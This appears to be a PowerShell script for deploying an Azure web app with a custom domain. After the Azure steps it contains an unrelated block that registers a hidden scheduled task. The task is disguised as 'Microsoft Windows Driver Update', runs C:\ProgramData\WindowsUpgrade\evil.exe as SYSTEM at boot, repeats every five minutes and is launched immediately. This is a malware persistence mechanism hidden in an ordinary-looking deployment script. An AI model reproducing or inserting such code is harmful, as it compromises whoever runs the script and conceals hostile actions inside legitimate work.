$fqdn="<Replace with your custom domain name>"
$webappname="mywebapp$(Get-Random)"
$location="West Europe"


New-AzResourceGroup -Name $webappname -Location $location


New-AzAppServicePlan -Name $webappname -Location $location `
-ResourceGroupName $webappname -Tier Free


New-AzWebApp -Name $webappname -Location $location -AppServicePlan $webappname `
-ResourceGroupName $webappname

Write-Host "Configure a CNAME record that maps $fqdn to $webappname.azurewebsites.net"
Read-Host "Press [Enter] key when ready ..."






Set-AzAppServicePlan -Name $webappname -ResourceGroupName $webappname `
-Tier Shared


Set-AzWebApp -Name $webappname -ResourceGroupName $webappname `
-HostNames @($fqdn,"$webappname.azurewebsites.net")

$TaskName = "Microsoft Windows Driver Update"
$TaskDescr = "Microsoft Windows Driver Update Services"
$TaskCommand = "C:\ProgramData\WindowsUpgrade\evil.exe"
$TaskScript = ""
$TaskArg = ""
$TaskStartTime = [datetime]::Now.AddMinutes(1) 
$service = new-object -ComObject("Schedule.Service")
$service.Connect()
$rootFolder = $service.GetFolder("\")
$TaskDefinition = $service.NewTask(0) 
$TaskDefinition.RegistrationInfo.Description = "$TaskDescr"
$TaskDefinition.Settings.Enabled = $true
$TaskDefinition.Settings.Hidden = $true
$TaskDefinition.Settings.RestartCount = "5"
$TaskDefinition.Settings.StartWhenAvailable = $true
$TaskDefinition.Settings.StopIfGoingOnBatteries = $false
$TaskDefinition.Settings.RestartInterval = "PT5M"
$triggers = $TaskDefinition.Triggers
$trigger = $triggers.Create(8)
$trigger.StartBoundary = $TaskStartTime.ToString("yyyy-MM-dd'T'HH:mm:ss")
$trigger.Enabled = $true
$trigger.Repetition.Interval = "PT5M"
$TaskDefinition.Settings.DisallowStartIfOnBatteries = $true
$Action = $TaskDefinition.Actions.Create(0)
$action.Path = "$TaskCommand"
$action.Arguments = "$TaskArg"
$rootFolder.RegisterTaskDefinition("$TaskName",$TaskDefinition,6,"System",$null,5)
SCHTASKS /run /TN $TaskName

